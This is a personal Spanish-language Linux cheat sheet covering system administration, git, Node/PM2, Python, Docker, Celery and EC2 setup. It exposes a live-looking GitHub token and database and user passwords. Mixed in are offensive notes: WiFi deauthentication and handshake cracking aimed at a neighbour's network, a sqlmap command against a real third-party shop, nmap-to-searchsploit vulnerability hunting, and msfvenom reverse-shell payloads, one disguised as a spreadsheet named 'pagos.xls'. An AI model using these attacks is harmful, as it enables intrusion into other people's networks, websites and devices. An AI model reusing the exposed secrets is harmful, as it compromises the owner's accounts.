# Linux
Comandos generales de Linux

### Actualizacion del sistema operativo
> sudo apt update && sudo apt full-upgrade && sudo apt upgrade && sudo apt update && sudo apt upgrade -y

### para borrar archivos
Para remover la carpeta completa
> rm -rf {dir-name}

### Control de procesos

> ps aux | grep admin -> Para ver los procesos que esta corriendo el administrador

> pkill firefox-esr -> matar todos los procesos que tengan el nombre "firefox-esr"

> free -h

### Para medir la calidad de la conexion

> ping -c 3 google.com

> ping 8.8.8.8

> ip addr show

> The Ping test helps to identify the quality of the Internet Connection. The more packages are received and less time was spent for packages to reach its destination, the better the internet connection. More packages lost during the request means the poorer connection.

### Mantencion de temporales

> sudo find /tmp -ctime +2000 -exec rm -rf {} +

> sudo find /tmp -type f -mtime +2000 -exec rm -f {} \;

> sudo find /var/tmp -type f -mtime +2000 -exec rm -f {} \;

> Borrar Cache => rm -rf /home/admin/.cache/*


### Control de procesos

> top

> sudo kill -9 XXX XXX


### Control de puertos
> sudo apt-get install lsof

### Para copiar
- The basic form of this command takes an input source (or sources) that you want to copy (files or directories) and a destination to copy the files or directories to:

> cp [OPTIONS] source_file target_file

> cp -i /home/admin/test/Servidor_RPA/routes/usuarios.js  /home/admin/Servidor_RPA/routes/usuarios.js

- How to copy a file to the current directory
> cp a.txt b.txt

- How to copy a file to another directory
> cp a.txt ../directory-1/

- How to copy multiple files to a directory
> cp first.txt second.txt ../directory-1/

- How to copy a directory to another directory
> cp -r directory-1 directory-2

- para prevenir overwritting, se agrega -i
> cp -i a.txt directory-1/a.txt

## Instalar Nano
sudo apt-get -y install nano

### Uso de NANO BASH
- Para poder guardar
> ctrl + O
 
- Guardar informacion
> ctrl + s

- Buscar texto en particular
> ctrl + w 

- Para salir
> ctrl + x

-para cortar
> ctrl + k 

-para pegar
> ctrl + u 

> alt + a y flechas para marcar texto, desmarcar alt + a

- Copiar en consola
> crtl + shift + c 

- Pegar  en consola
> crtl + shift + v

### Uso de Nano Bash

- Para comenzar un archivo 
> nano XXXX.sh\

- Para ejecturar el archivo 
> bash XXXX.sh\

- Para guardar el archivo se aprieta 
> Ctrl + X, despues Yes\

Para declarar una variable en un string puede ser con read o anteponiendo el signo $


## Modificacion del bashrc

- para ver el actual path
> echo $PATH => /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

- abrir el bash  => 
> nano ~/.bashrc

**al final del archivo .bashrc colocar el antiguo path mas el nuevo **

export PATH=[/home/dave/work]:$PATH

- cargar el antiguo path
> 'export PATH="/home/dave/work:$PATH"'

- cargar el nuevo bashrc
> source ~/.bashrc

- o puede ser separado por :
> export PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/ngempin/.local/bin"

## Para crear Aliases

- Modificar el bash aliases
> sudo nano ~/.bash_aliases

- Cargar el nuevo bash aliases
> source ~/.bash_aliases

## Programas
### Revision del puerto

> lsof -i tcp:3000 => para ver quien bloquea el puerto

> sudo kill -9 (lsof -i tcp:3000 -t) => para cerrar el proceso en el puerto 3000



### Instalar screenfetch
> sudo apt-get install screenfetch
> screenfetch

### Mediciones de rendimiento

> free -h

> df -h

> systemd-analyze

> systemd-analyze blame | head

### Install Python

> sudo apt-get install python3

> sudo apt-get install python3-pip -y


#### PEP 668

> sudo apt install python3.11-venv

> source .venv/bin/activate

> pip install --upgrade pip

> pip install --upgrade virtualenv

> deactivate 

### Instalacion de Firefox

- Step1 : Download Firefox
> sudo apt-get install firefox-esr -y

### Instalacion de Gecko Driver
> https://github.com/mozilla/geckodriver/releases

- Step1 : Download Gecko Driver
> wget https://github.com/mozilla/geckodriver/releases/download/v0.30.0/geckodriver-v0.30.0-linux64.tar.gz

- Step2: Unzip tar file
> sudo tar -xvf geckodriver-v0.30.0-linux64.tar.gz

- Step3: Move Gecko Driver to Binary Location
> sudo mv geckodriver /usr/local/bin/

- Step4: Change Current Directory to Binary Location
> cd /usr/local/bin/

- Step5: Make Executable Permission to 'geckodriver'
> sudo chmod +x geckodriver

- Step6: Add path
> /usr/local/bin/geckodriver

- Step6: Open bashrc
> nano ~/.bashrc

- Step7: Load bashrc
> source ~/.bashrc

### Install git

> sudo apt install git -y

> sudo apt-get install git -y

- una vez instalado se puede ocupar "git clone URL", para bajar cualquier repositorio

> git --version

### Clonar en GitHub.

- Colocar el siguiente URL
  
> git clone --branch V22052023 https://github.com/matiassea/Servidor_RPA.git

> User = matiassea

> Passsword = ********** (Personal access tokens (classic))

> Obtener el password desde el token clasic en Settings -> Developer Settings -> Personal access tokens (Personal access tokens (classic))

> Al momento de crear el token se deben marcar todas las opciones para que permita bajar el proyecto 

#### Para instalar en servidor

https://namespaceit.com/blog/remote-support-for-password-authentication-was-removed-on-august-13-2021-please-use-a-personal-access-token-instead

> git config --global user.name matiassea

> git config --global user.email matiassea@hotmail.com

> git config -l

### Clonar una rama en especifico
- el usuario es matiassea. El password debe asegurarse que este activo en la pagina de Github Actualizar el token clasic en Settings -> Developer Settings -> Personal access tokens

- Para clonar una rama
> git clone https://github.com/matiassea/Servidor_RPA.git

- Para clonar una rama en especificos
> git clone --branch branchname remote-repo-url
- ejemplo
> git clone --branch V22052023 https://github.com/matiassea/Servidor_RPA.git”

> Username for 'https://github.com' : matiassea

> Password for 'https://github.com' : <Settings -> Developer Settings -> Personal access tokens -> Tokens (Classic) -> Generate new Token>

## NodeJS

### Install Nodejs

sudo apt-get update && sudo apt-get upgrade

sudo apt install curl

curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash

source ~/.bashrc

nvm list-remote

nvm install v<N° version> v12.22.12

nvm list

sudo apt install npm

## Install npm

sudo apt install npm

npm -v

sudo apt-get update && sudo apt-get upgrade

## Install PM2

sudo npm install pm2 -g

En caso de error por deprecacion de "npm WARN deprecated uuid@3.4.0: Please upgrade  to version 7 or higher"
npm install uuid@latest 

pm2 -v

pm2 ls => procesos que estan en ejecucion

pm2 startup => Para iniciarse (se copia y pega el comando que sugiere este comando)

pm2 start project-1/index.js

pm2 list = pm2 ls

pm2 restart project-1/index.js --watch

pm2 restart pid --watch

pm2 stop ruta/pid/id

### Logs

pm2 flush              # Empty all log files

pm2 logs [--raw]       # Display all processes logs in streaming

pm2 start ecosystem.config.js
 
 
## AWS

ssh -i "Server V26092022.pem" admin@ec2-3-142-225-147.us-east-2.compute.amazonaws.com

Host name (or IP address) => admin@ec2-18-217-57-98.us-east-2.compute.amazonaws.com
SSH => Auth => Private key file for authentication => ServerV26092022
Connection => Second between keeplives => 180


## Python

### Para instalar pip

sudo apt-get install python3-pip

### Virtualenv

pip install virtualenv

virtualenv --version

### Para activar entorno virtual

Para crear => virtualenv <virtualenv_name> => virtualenv env

Para activar => source <virtualenv_name>/bin/activate => source env/bin/activate

Para desactivar => deactivate


### Para instalar librerias segun archivo de configuracion

pip install -r requirements.txt


# Levantamiento de servidor en EC2

### Clonar una rama en especifico

> git clone https://github.com/matiassea/Servidor_RPA.git

> git clone --branch <branchName> <remote-repo-url>

> Username for 'https://github.com' : matiassea

> Password for 'https://github.com' : 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
 
> npm i
 
### Instalar las librerias para Node
 
ejecutar "npm install" en la carpeta del servidor, aparecera la carpeta node_modules

### Virtualenv

Para crear => virtualenv <virtualenv_name> => virtualenv env

Para activar => source <virtualenv_name>/bin/activate => source env/bin/activate

Para desactivar => deactivate

### Para instalar librerias segun archivo de configuracion

pip install -r requirements.txt 
 
### Revisar .env
 
Variables de entorno de Virtualenv y Impresion_OC

se cambia el path para adjuntar archivos en el envio de email



# Configuracion de instancia en EC2

### Configuracion Putty

> Abrir Putty Key Generator 

> Apretar Load

> Seleccionar la llave

> Apretar “Save private key”

> En "Seccion" -> Host name (or IP Address) colocar "admin@ “Public IPV4 DNS” (ideal que tenga la elastic IP address creada para evitar el cambio del public)

> En "Connection" -> SSH -> Auth -> Credentials > "Private key file for authentication" -> Adjuntar la llave

> En "Connection" -> "Seconds between keepalives 180

> En "Seccion" -> Save las configuraciones


### Comienzo instalacion instancia

> sudo apt update && sudo apt full-upgrade && sudo apt upgrade && sudo apt update && sudo apt upgrade -y

### Curl

> sudo apt install wget

### install gnupg

https://levelup.gitconnected.com/how-to-install-gnupg-on-debian-11-2fcae38bc257

> sudo apt-get -y install gnupg

### MySQL

> wget https://dev.mysql.com/get/mysql-apt-config_0.8.26-1_all.deb (el link obtenido desde "No thanks, just start my download."

> sudo dpkg -i mysql-apt-config_0.8.26-1_all.deb

> sudo apt update

> wget http://archive.ubuntu.com/ubuntu/pool/main/o/openssl/libssl1.1_1.1.1f-1ubuntu2_amd64.deb

> sudo dpkg -i libssl1.1_1.1.1f-1ubuntu2_amd64.deb -> debido a error de libssl1.1

> sudo apt install mysql-server

> se agrega la contraseña (unt....83) y elegir contraseña recomendada

> sudo apt update

> Checkeando el status -> sudo service mysql status -> debe decir "Active: active (running)"

> sudo systemctl is-enabled mysql

> sudo mysql -u root -punterricht83 -> Para ingresar a SQL

### Nano

> sudo apt-get -y install nano

> configurar nano -> nano ~/.nanorc

set linenumbers

set constantshow

set const

set autoindent

set mouse

set smooth

set softwrap

set tabsize 4

set matchbrackets "(<[{)>]}"


> man nanorc

> para ver mas configuraciones sudo nano /etc/nanorc 

#### Funcionalidades

> Set the target by moving the cursor to the beginning of the text and pressing CTRL + 6.

> Now highlight the text you want to copy using the arrow keys.

> ALT + 6 to copy. 

> CTRL + U to paste


### lsof

> sudo apt-get install lsof

### Python

> sudo apt install python3

> sudo apt install python3-pip -y

> sudo apt-get install python3-venv -y 

#### Instalacion de virtualenv especifico 

> python3 -m venv Servidor_RPA/robots/.venv

> source Servidor_RPA/robots/.venv/bin/activate

> python3 -m pip install virtualenv

> nano Servidor_RPA/robots/requirements.txt (eliminar Pyinstaller del requirements.txt)

> python3 -m pip install -r Servidor_RPA/robots/requirements.txt

> pip install --upgrade pip virtualenv

### Firefox

> sudo apt-get install firefox-esr -y

> wget https://github.com/mozilla/geckodriver/releases/download/v0.30.0/geckodriver-v0.30.0-linux64.tar.gz

> sudo tar -xvf geckodriver-v0.30.0-linux64.tar.gz

> sudo mv geckodriver /usr/local/bin/

> cd /usr/local/bin/

> sudo chmod +x geckodriver

### Github

> sudo apt install git -y

> sudo apt-get install git -y

> sudo apt-get update -y && sudo apt-get upgrade -y

### NodeJS

> sudo apt install curl -y

> curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash

> source ~/.bashrc

> nvm list-remote

> nvm install v12.22.12 se cambia a V14.21.3 debido a que PM2 lo solicita

> nvm list

> sudo apt install npm -y

> npm -v

> Una vez clonado el codigo y bajado al servidor ejecutar npm i, para instalar los modulos para la ejecucion 

### PM2

> sudo apt-get update -y && sudo apt-get upgrade -y

> sudo npm install pm2 -g

> sudo npm install uuid@latest

### Configuracion de alias

> sudo nano ~/.bash_aliases -> Modificar el bash aliases

> source ~/.bash_aliases -> Cargar el nuevo bash aliases

alias ..="cd .."

alias lñ="ls -la"

alias up="sudo apt update && sudo apt upgrade -y"

alias sql="mysql -u root -punterricht83"

alias go="pm2 start ecosystem.config.js"

alias look="pm2 logs"

alias look2="pm2 logs --lines 500"

alias look3="pm2 logs --lines 1000"

alias lookcl="pm2 flush"

alias stop="pm2 stop 0"

alias occlean="rm /home/admin/FinalizacionCancelacion/oc/*"



########################################################################################################################

###  Entorno grafico LXDE
> sudo apt update
> sudo apt install lxde task-lxde-desktop -y
> sudo apt-get -y install gdm3
> seleccionar gdm3
> sudo dpkg-reconfigure gdm3
> sudo apt-get install xrdp
> sudo passwd admin => unterricht83




Levantamiento de errores

GetManagedObjects() failed: org.freedesktop.systemd1.NoSuchUnit: Unit dbus-org.bluez.service not found.

journalctl -p err..alert

 https://wiki.archlinux.org/title/Systemd/Journal


# Para control de datos de la red

aptitude search nethogs

sudo apt install nethogs

nethogs


# Discos en Linux

sda

sdb

sd0 o sr0


# Airmon

sudo airmon-ng

airmon-ng start wlan0

airodump-ng wlan0

airodump-ng --bssid 1C:B0:44:BF:33:45 --channel 11 wlan0

# Nmap


ifconfig

ping 192.168.1.91

nmap -sP 192.168.1.0/24 => es desde 0/24.
Con eso saco las IP conectadas a la red

nmap -sT -p 80,443 nmap 192.168.1.0/24 => es desde 0/24

nmap -sS -p 80,443 nmap 192.168.1.0/24 => es desde 0/24

nmap -sT (IP)

nmap -O (IP)

nmap -A (IP)

nmap -p- -sV (IP)
Se escanean los 65.535 puertos.
Con esto obtengo las debilidades que son posible de explotar

searchsploit (se pega el programa obtenido en el paso anterior)
se busca si tiene algun backdoor con metaexploit

nmap --script vuln IP

ip iphone 192.168.1.83

min 10:00 Nmap tutorial to find networks vulnerabilities


## Informacion del hardware

lscpu => procesador

listado de hardware => sudo apt-get install lshw => sudo lshw -short

sudo apt-get install hwinfo => sudo hwinfo --short


## Testeo de memoria RAM

sudo apt install dmidecode

sudo dmidecode --type 17

sudo apt install cpu-x

sudo cpu-x


### Informacion de la arquitectura

Para saber la arquitectura de un Linux => uname –m

x86_64 = > es el correcto, 64 bits

If the response is i686, you have a 32-bit version of Linux.\

If the response is x86_64, you have a 64-bit version of Linux.\

You can find out more detail about your particular installation of Linux, like your kernel version, by entering => uname –a



### Comandos generales

crear carpeta => mkdir <dirName>

crear archivo => touch <fileName.py>

Ayuda del comando ls => man ls

Para borrar directorio completo => rm -rf <directoryName>
 
Para borrar un archivo => rm <fileName>

Informacion del archivo => stat <file_name> 

ls -l -a

pwd

cd /

uname -i

cd

ls --file-type

ls --file-type -a -l

busqueda recursiva y con informacion completa => ls -a -l -R

Vista de archivos recursivas, vista humana y que muestre los permisos => ls -h -l -R. 

Para abir archivos => cat,less XXXXX.XXX

To remove one or more empty directories use the -d option => rm -d dirname 

sudo rm -rvi app/ => If you want rm to ask you to confirm before deleting every directories and files

Para seleccionar la impresion de una linea segun string d euna linea se ocupa grep, ej: ifconfig | grep broadcast

Para seleccionar una posicion de esa linea se utiliza awk {print$2}

Para crear alias ipaddress="ifconfig | grep broadcast | awk '{print $2}'"

alias ipaddress="echo $(ifconfig | grep broadcast | awk '{print $2}')"


### Manejo de archivos comprimidos

wget -c [URL] -O - | tar -xz

The wget option -O specifies a file to which the documents is written, and here we use -, meaning it will written to standard output and piped to tar and the tar flag -x enables extraction of archive files and -z decompresses, compressed archive files created by gzip.

To extract tar files to specific directory, /etc/nginx/ in this case, include use the -C flag as follows.
$ sudo wget -c [URL] -O - | sudo tar -xz -C /home/ngempin/server_aws

Extraer y copiar archivo a otro directorio
tar -xf [file_name.tar] -C [/target/directory]


### Control de procesos

ps aux | more

ps aux

### Instalando HTOP

sudo apt-get install htop

ejecutar htop

# Comandos para inspeccionar el PC
LSUSB => USB dispoibles
LSUSB -v
LSMOD => /proc/modules

DMESG
DMIDECODE

# Airmon
iwconfig => Mode:Managed, esto debe ser cambiado a modo monitor
la tarjeta debe estar en estado monitor
ifconfig wlan0
ifconfig wlan0 down => para dejar la tarjeta en modo monitor
airmon-ng check kill => congela todos los proceso de la tarjeta
airmon-ng start wlan0 => para comenzar el proceso, en modo monitor
iwconfig => confirmar que la tarjeta este en monitor mode
el adaptador debe soportar el modo de monitor
en monitor mode
airodump-ng wlan0 => Monitoreo de redes
airodump-ng -c1 -w capture -d BSSID wlan0 => the objective is knock station (access point) and achive the handshacke
guardando esta informacion en el archivo capture.cap
En segundo terminal colocar la siguiente linea
aireplay-ng --deauth 0 -a BSSID -c STATION wlan0 => Para hacer el handshake
Saldra PMKID found
Despues WPA Handshake

ls
el archivo mas importante es capture.cap
wireshark nombre archivo
filtrar por eapol

airmon-ng stop wlan0
iwconfig
Para aplicar al dictionary
aircrack-ng capture-01.cap -w /usr/share/dict/wordlist-probable.txt
Probar con rockyou.txt, que se encuentra en /usr/share/wordlists/
Antes se debe descomprimir con gzip -d rockyou.txt.gz

Atacando al 810 =>7C:DB:98:E2:95:FC CH1
Atacando a la vecina => 18:70:3B:E6:FF:53 CH7
airodump-ng wlan0 => para rescatar BSSID y chanel



### Instalar Python

sudo apt install python-pip

sudo apt install python3-pip

python -v

python3 -v

pip -v

pip3 -v

### Instalar Python

https://www.python.org/downloads/source/

En Gzipped.Copiar el enlace

Asegurar que esta instalado wget

escribir "wget [link copiado en Gzipped]"

descomprimir con tar xwf [ruta de alojamiento]

entrar a => su -

ingresar a => root@debian:/home/ngempin/Downloads/Python-3.9.7# 

en la carpeta de python ./configure

./configure --enable-optimization

en caso de error activar => sudo apt-get install build-essential

en caso de dudas => cat README.rst 

ṕroceso de compilacion => make

Instalar el idle => sudo apt-get install idle3


## Xclip

reemplaza a pyperclip

sudo apt-get install xclip


## Geckodriver

wget https://github.com/mozilla/geckodriver/releases/download/v0.29.0/geckodriver-v0.29.0-linux32.tar.gz

tar -xvzf geckodriver-v0.29.0-linux32.tar.gz 

For Linux based system, download geckodriver. Extract it and copy the driver to /usr/local/bin and finally make it executable (chmod +x geckodriver).




## Configure bash alieses

nano -/.bash_aliases

open nano

alias hackwifi='besside-ng wlan0'

Ctrl + S

Y

enter

hackwifi

Para actualizar el paquete de instalacion
sudo apt install

# Arch

pacman -Syu

https://wiki.archlinux.org/title/System_maintenance#Upgrading_the_system

Use pacman -Qtd to check for packages that were installed as a dependency but now, no other packages depend on them. If an orphaned package is still needed, it is recommended to change the installation reason to explicit. Otherwise, if the package is no longer needed, it can be removed. 



# SQLMAP
└─$  sqlmap -u https://www.realfitness.cl/detalle-producto.php?id=2 --dbs                                         127 ⨯ 3 ⚙

https://www.creadpag.com/2018/05/inyeccion-sql-en-kali-linux-usando.html
http://achap.cl/festival_2017/ganadores_categoria.php?id=4






# Payload para Android

https://spyboy.blog/2020/11/08/how-hackers-remotely-hack-android-using-payload/

https://hackingtoots.wordpress.com/2020/05/12/how-to-make-android-payload-using-msfvenom/

https://codepre.com/quick-guide-how-to-hack-android-with-kali-linux.html

https://spyboy.blog/2020/05/29/how-hackers-hack-android-using-metasploit-over-lan-wan/

https://spyboy.blog/2020/11/08/how-hackers-remotely-hack-android-using-payload/

https://www.androidgigs.com/how-to-hack-android-phone-remotely/

https://www.androidgigs.com/how-to-hack-android-phone-remotely/

# Instalando el metasploit
sudo apt-get install metasploit-framework

msfvenom -h

gem install bundle

bundle install

gem update --system

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.91 LPORT=4444 -o payloadname.apk  => Creando el payload

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.91 LPORT=4444 -o pagos.xls => otro payload

# En otra consola

msfconsole => Se corre en otra consola

use exploit/multi/handler

set LHOST 192.168.1.91



## Celery

1)	“django-admin.py startproject src”. Para comenzar haciendo la carpeta de configuración

2)	Para el proyecto se debe crear base de datos, q por omision en django funciona con SQL.

3)	Para crear base de datos. “python manage.py migrate”

4)	Django tiene un servidor de prueba, para turn on se debe escribir “python manage.py runserver”

5)	Una vez iniciado el servidor, da el ip y puerto.

6)	Crear primera vista y confgurar el URL

7)	Se arregla el 

8)	Peticion => Request, crea objeto HTTP Request, asociado a la función vista

9)	Respuesta => HTTPResponse

10)	url.py genera listado de URL a ser vistas, se genera dentro de la tupla. Aquí se generan las rutas


## Celery

django-admin.py startproject django_email_celery  Para crear el projecto
python manage.py startapp example  Para crear carpeta example
python manage.py runserver [en la misma carpeta manager]

El puesto 19960 esta ocupado, por lo que se cambiara de puerto
Para esto se ocupo netstat -a -n -o |find “54”
Y se confirmo con Putty, opción Telnet, localhost, puerto 19960
 

Para corrrer Celery en cmd de la carpeta
celery -A django_email_celery worker -l info
 
## Test Cornershop

Para instalar todas las librerias segur requirements.txt

pip install -r requirements.txt

https://note.nkmk.me/en/python-pip-install-requirements/

python manage.py runserver 0.0.0.0:8000

Para ver en detalle una librería

pip show isort

Se rebaja version de isort

isort==4.3.21

Crear grupo y usuario (este paso no es necesario)

Sudo useradd cornershop

Sudo groupadd cornershop

Docker PS 
Docker exec -it (ID container) bash (joins already container is bash prompt)
pwd /opt/cornershop debe estar en /opt/cornershop/backend_test
celery -A backend_test worker -i info




# Historial

python manage.py runserver 0.0.0.0:8000

Instalo Docker Toolbox, debido a que es para Windows menor a V10.

### Instalacion de Docker en Linux

Sudo apt install Docker.io

Docker images => muestas las imágenes que estan instaladas

Docker pull ubuntu => baja la imagen llamada ubuntu

Docker ps => muestra los contenedores (proceso) que se ejecuta, lista de containers

Docker ps -a => muestra los contenedores detenidos

Docker ps -a1 => muestra los ID contenedores detenidos

Docker exec -it (ID container)

Docker run ubuntu => corre la imagen ubuntu

Docker run ubuntu -it bash => Correr imagen ubuntu, de forma interactive (-it), con el programa bash

Desde una imagen se puede ejecutar multiples contenedores (procesos) desde solo una imagen

Docker rm ID=> para eliminar el proceso


## Docker en Linux

Todos los comandos de Docker se corren con SUDO

Se debe instalar Docker desde la consola

Pagina especial para instalar Docker desde la consola

Para Kali Linux es una instalación especial que esta en linuxhint.com/install_docker_kali_linux

Si todo sale bien debe probarse por medio de Docker verion o sudo Docker run hello-world

Despues se debe a ver el “Post—installation steps for Linux” para instalar sacar el sudo de los comandos dockers
 
### Memoria Swap

Aumento de la memoria 

Swappiness puede tener un valor entre 0 y 100, pero por defecto se utiliza 60. Hay que aclarar que este valor puede no ser igualmente eficaz en todos los casos, ya que dependerá del uso individual, las especificaciones del hardware o las necesidades del usuario. 

Cuanto mayor sea el valor del parámetro swappiness, más agresivamente el kernel utilizará swap. Por ello, se recomienda utilizar un valor bajo que reduzca el intercambio desde RAM y mejore la capacidad de respuesta del sistema (rendimiento global, funcionalidad y velocidad del sistema operativo).

### Operacion con archivo Make

make -f Makefile

make up

Faltaba instalar docker compose, para comprobar Docker-compose --version

https://docs.docker.com/compose/install/

# Operacion con Celery

find / -name django-admin => para ver donde fue instalado el django-admin

### Ruta con la cual debemos agregar cada corrida
/home/ngempin/.local/bin/django-admin 

/home/ngempin/.local/bin/django-admin startproject celery_example

This is likely because you either used the --user option to pip 
install, or you set up pip in such a way that it automatically does 
that. Hence, everything gets installed in $HOME/.local. You may want
to add $HOME/.local/bin to your $PATH for the future.

### Para comenzar el proyecto
django-admin startproject celery_example

### Para crear la carpeta o voler a correr las configuraciones
python manage.py migrate

### Para crear la app
Para levantar la app python  manage.py startapp app , este paso se debe confirmar ya que se crea una carpeta llamada app

### Para levantar el servidor
python manage.py runserver 0.0.0.0:8000

### Para levantar el celery work -A

/home/ngempin/.local/bin/celery -A backend_test worker -l info

find /home -iname or -name celery, este comando es para buscar archivos segun el nombre

Para navegar se puede utilizar w3m http://127.0.0.1:8000/

### Para activar shell de python
from notifications.tasks import sum

t=sum.delay(3,5)

t.status => necesitamos leer ese mensaje.

Para evitar "AttributeError: 'DisabledBackend' object has no attribute '_get_task_meta_for'"

t (enter)

<AsyncResult: d988e167-c44f-4624-90f1-cb6f70002a64>

Task notifications.tasks.sum[d988e167-c44f-4624-90f1-cb6f70002a64] succeeded in 5.006342895999751s: 5


### Install django
pip install django-celery-results

python manage.py migrate

Debe salir este mensaje => "Applying django_celery_results.0007_remove_taskresult_hidden... OK"

python manage.py inspectdb

class DjangoCeleryResultsTaskresult(models.Model):
    task_id = models.CharField(unique=True, max_length=191)
    status = models.CharField(max_length=50)
    content_type = models.CharField(max_length=128)
    content_encoding = models.CharField(max_length=64)
    result = models.TextField(blank=True, null=True)
    date_done = models.DateTimeField()
    traceback = models.TextField(blank=True, null=True)
    meta = models.TextField(blank=True, null=True)
    task_args = models.TextField(blank=True, null=True)
    task_kwargs = models.TextField(blank=True, null=True)
    task_name = models.CharField(max_length=255, blank=True, null=True)
    date_created = models.DateTimeField()
    worker = models.CharField(max_length=100, blank=True, null=True)

    class Meta:
        managed = False
        db_table = 'django_celery_results_taskresult'
        
        
pip install django-celery-beat

/home/ngempin/.local/bin/celery -A celery_example beat -l info => monitoreo de las tareas

### Comandos varios
celery -A my_celery inspect schedule

celery -A my_celery inspect revoked

celery -A my_celery inspect stats

### Para limpiar la cola
celery -A my_celery purge

celery -A my_celery purge -Q test

### Events
celery -A my_celery control enable_events

celery -A my_celery events

celery -A my_celery events --help

### Flower
pip install flower

celery -A my_celery flower







